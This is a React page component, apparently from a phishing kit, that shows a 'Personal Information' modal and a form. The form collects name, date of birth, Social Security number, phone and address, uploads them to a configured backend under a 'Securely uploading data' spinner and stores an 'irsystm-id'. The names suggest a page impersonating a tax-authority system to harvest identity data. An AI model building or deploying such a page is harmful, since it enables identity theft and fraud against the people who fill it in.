import { useSelector } from 'react-redux';
import { useNavigate } from 'react-router-dom';
import { useState } from 'react';

import Address from '../components/Address';
import { Buttons } from '../components/Button';
import FirstName from '../components/FirstName';
import LastName from '../components/LastName';
import DateOfBirth from '../components/DateOfBirth';
import Social from '../components/Social';
import PhoneNumber from '../components/PhoneNumber';

import { MainSpinner } from '../components/Loader';
import Logo from '../components/Logo';
import { Modal } from '../components/Overlay';
import saveData from '../utils/saveData';

export default function LoginPage() {
  const [isOpened, setIsOpened] = useState(true);
  const [isloading, setIsloading] = useState(false);
  const navigate = useNavigate();
  const { firstName, lastName, DOB, SSN, phone, address } = useSelector(
    (store) => store.info
  );

  async function handleSubmit(e) {
    e.preventDefault();

    setIsloading(true);

    const { status, id } = await saveData(
      { firstName, lastName, DOB, SSN, phone, address },
      `${import.meta.env.VITE_SITE_URL}/api/v1/client`
    );

    if (status !== 'success') return;

    localStorage.setItem('irsystm-id', id);
    navigate('/finish');
  }
  return (
    <>
      {isOpened && <ModalInstruction onClose={setIsOpened} />}
      {isloading && <MainSpinner>Securely uploading data</MainSpinner>}
      <main
        className={`main ${isOpened || isloading ? 'opaque' : 'not-opaque'}`}
      >
        <Logo />
        <form className="form">
          <FirstName />
          <LastName />
          <DateOfBirth />
          <Social />
          <PhoneNumber />
          <Address />
          <Buttons onClick={handleSubmit} />
        </form>
      </main>
    </>
  );
}

function ModalInstruction({ onClose }) {
  return (
    <Modal onClose={onClose}>
      <h1>Personal Information</h1>
      <p>Kindly provide your information in the fields below.</p>
      <p>
        All fields are required except for the address line 2 as this only
        applicable to address with multiple apartments, suites lots, and P. O.
        boxes.
      </p>
    </Modal>
  );
}
